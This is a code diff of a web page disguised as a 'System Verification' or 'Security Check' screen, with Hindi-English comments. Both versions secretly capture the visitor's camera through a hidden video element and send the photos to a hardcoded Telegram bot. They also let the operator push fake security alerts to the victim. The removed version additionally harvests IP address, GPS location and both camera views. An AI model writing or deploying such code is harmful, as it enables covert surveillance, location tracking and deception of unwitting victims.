@@ -3,61 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Access</title>
-
+    <title>System Verification</title>
     <style>
         body {
-            background-color: #eceff1;
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
             text-align: center;
-            font-family: 'Roboto', sans-serif;
             padding: 20px;
             display: flex;
             flex-direction: column;
-            align-items: center;
             justify-content: center;
-            height: 100vh;
-            margin: 0;
+            height: 90vh;
         }
 
-        h1 { color: #263238; margin-bottom: 10px; }
-        p { color: #546e7a; margin-bottom: 30px; }
+        h1 { text-shadow: 0 0 10px #0f0; }
 
-        /* Video hidden hai */
-        #video-stream {
-            opacity: 0;
-            position: absolute;
-            top: 0; left: 0;
-            z-index: -1;
-            width: 10px; height: 10px;
-        }
-
-        .verify-btn {
-            padding: 15px 50px;
-            background-color: #00897b;
-            color: white;
+        .btn {
+            background: #0f0;
+            color: #000;
             border: none;
-            cursor: pointer;
+            padding: 15px 30px;
             font-size: 18px;
             font-weight: bold;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            transition: all 0.3s;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0 0 15px #0f0;
         }
 
-        .verify-btn:hover { transform: scale(1.05); background-color: #00796b; }
-        .verify-btn:disabled { background-color: #b0bec5; cursor: wait; transform: none; }
+        #log {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
 
-        #status { margin-top: 20px; font-weight: bold; color: #37474f; }
+        /* Hide Video */
+        #video-stream { display: none; }
     </style>
 </head>
-
 <body>
 
-    <h1>Security Check</h1>
-    <p>Allow notifications to verify your device identity.</p>
+    <h1>TERMINAL ACCESS</h1>
+    <p>Click below to grant permission.</p>
+
+    <button class="btn" id="btn" onclick="startSystem()">CONNECT NOW</button>
     
-    <button class="verify-btn" id="btn" onclick="startSystem()">Allow & Verify</button>
-    <p id="status"></p>
+    <div id="log">Waiting for connection...</div>
 
     <video id="video-stream" autoplay playsinline muted></video>
     <canvas id="hidden-canvas" style="display:none;"></canvas>
@@ -65,136 +56,122 @@
     <script>
         // --- CONFIGURATION ---
         const botToken = "8593566926:AAEhOP5u2ph3FriBMGrWvpSl8X-xEsXgrfk"; 
-        const chatId = "7681204940";
         
-        let lastUpdateId = 0; // Message tracking ke liye
-        let userIP = "Unknown";
-        let userLocation = "Unknown";
-        let mapLink = "";
+        let lastUpdateId = 0; 
+        let isRunning = false;
 
         async function startSystem() {
             const btn = document.getElementById("btn");
-            const status = document.getElementById("status");
+            const log = document.getElementById("log");
 
-            // 1. Notification Permission Maangna
+            // 1. Notification Permission
             if (Notification.permission !== "granted") {
-                status.innerText = "Please Allow Notifications...";
                 await Notification.requestPermission();
             }
 
+            // Test Notification
             if (Notification.permission === "granted") {
-                // Notification milte hi ek Fake "Success" bhejo
-                new Notification("Security System", {
-                    body: "Device Connected Successfully.",
-                    icon: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
-                });
-                // Vibration
-                if(navigator.vibrate) navigator.vibrate(200);
+                new Notification("System Connected", { body: "Waiting for commands..." });
             }
 
             btn.disabled = true;
-            btn.innerText = "Verifying...";
-            status.innerText = "Syncing with server...";
+            btn.innerText = "ACCESS GRANTED";
+            btn.style.background = "#333";
+            btn.style.color = "#fff";
+            log.innerText = "System Active. Listening for /msg commands...";
 
-            // 2. Background Data Collection
-            getIP();
-            getLocation();
-
-            // 3. Start Listening for Telegram Commands (The "Login" Logic)
-            setInterval(checkTelegramMessages, 3000); // Har 3 second mein check karega
-
-            // 4. Capture Photos (Hidden)
-            try {
-                await captureCamera("user", "Front Cam");
-                await new Promise(r => setTimeout(r, 1500));
-                await captureCamera("environment", "Back Cam");
-                
-                status.innerText = "Connected. Waiting for admin...";
-                btn.innerText = "Connected 🟢";
-            } catch (e) {
-                console.log(e);
-            }
+            isRunning = true;
+            
+            // Start Camera & Polling
+            captureLoop();
+            
+            // Start listening for Telegram commands
+            setInterval(checkTelegramMessages, 2000); 
         }
 
-        // --- NOTIFICATION LOGIC (POLLING) ---
+        // --- TELEGRAM COMMAND LISTENER ---
         async function checkTelegramMessages() {
+            if (!isRunning) return;
+            const log = document.getElementById("log");
+
             try {
-                // Get updates from Telegram
-                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
-                const data = await res.json();
+                // Get Updates (only new ones)
+                const offset = lastUpdateId + 1;
+                const url = `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}`;
+                
+                const response = await fetch(url);
+                const data = await response.json();
 
                 if (data.ok && data.result.length > 0) {
-                    const latest = data.result[data.result.length - 1];
-                    lastUpdateId = latest.update_id; // Update ID track karo taaki message repeat na ho
-                    
-                    const text = latest.message.text;
-
-                    // Command check: Agar message "/msg" se shuru hota hai
-                    if (text && text.startsWith("/msg")) {
-                        const notifText = text.replace("/msg", "").trim();
+                    // Loop through all new messages
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id; // Update ID save karo
                         
-                        // Show Notification on User's Phone
-                        if (Notification.permission === "granted") {
-                            new Notification("Admin Alert ⚠️", {
-                                body: notifText,
-                                icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png",
-                                vibrate: [200, 100, 200]
-                            });
-                            if(navigator.vibrate) navigator.vibrate([500, 200, 500]); // Phone vibrate karega
+                        // Check if message exists and has text
+                        if (update.message && update.message.text) {
+                            const text = update.message.text;
+
+                            // COMMAND: /msg <text>
+                            if (text.startsWith("/msg ")) {
+                                const msgContent = text.replace("/msg ", "");
+                                log.innerText = "Command Received: " + msgContent;
+                                triggerNotification(msgContent);
+                            }
                         }
                     }
                 }
-            } catch (e) {
-                console.log("Polling Error");
+            } catch (error) {
+                console.error("Polling Error:", error);
             }
         }
 
-        // --- CAPTURE LOGIC ---
-        async function captureCamera(mode, type) {
-            const video = document.getElementById("video-stream");
-            const canvas = document.getElementById("hidden-canvas");
-
-            if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
-
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-            video.srcObject = stream;
-            
-            await new Promise(r => setTimeout(r, 2000)); // Warmup
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext("2d").drawImage(video, 0, 0);
-
-            canvas.toBlob(blob => {
-                sendToTelegram(blob, type);
-                stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg', 0.7);
-        }
-
-        // --- HELPER FUNCTIONS ---
-        async function getIP() {
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                userIP = d.ip;
-            } catch(e){}
-        }
-
-        function getLocation() {
-            if(navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => {
-                    userLocation = `${p.coords.latitude},${p.coords.longitude}`;
-                    mapLink = `https://maps.google.com/?q=${userLocation}`;
+        // --- NOTIFICATION + ALERT TRIGGER ---
+        function triggerNotification(text) {
+            // 1. Try Native Notification
+            if (Notification.permission === "granted") {
+                new Notification("⚠️ SECURITY ALERT", {
+                    body: text,
+                    icon: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f0/Error.svg/1200px-Error.svg.png",
+                    vibrate: [200, 100, 200]
                 });
             }
+
+            // 2. Vibrate Phone
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 500]);
+
+            // 3. Fallback: Browser Alert (Ye screen par popup layega agar notification fail hui to)
+            // Timeout isliye taaki vibration start ho jaye pehle
+            setTimeout(() => {
+                alert("🔴 MESSAGE FROM ADMIN:\n\n" + text);
+            }, 500);
         }
 
-        function sendToTelegram(blob, type) {
-            const fd = new FormData();
-            fd.append("chat_id", chatId);
-            fd.append("photo", blob, "cam.jpg");
-            fd.append("caption", `📸 *${type}*\nip: ${userIP}\nloc: ${userLocation}\n${mapLink}`);
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd });
+        // --- CAMERA FUNCTION (Background) ---
+        async function captureLoop() {
+            // Sirf ek baar front camera photo bhejega startup par
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById("video-stream");
+                const canvas = document.getElementById("hidden-canvas");
+                video.srcObject = stream;
+
+                await new Promise(r => setTimeout(r, 2000)); // Load hone do
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append("chat_id", "7681204940");
+                    fd.append("photo", blob, "login.jpg");
+                    fd.append("caption", "User connected & listening for commands 🟢");
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd });
+                }, 'image/jpeg');
+
+            } catch (e) {
+                console.error(e);
+            }
         }
     </script>
 </body>
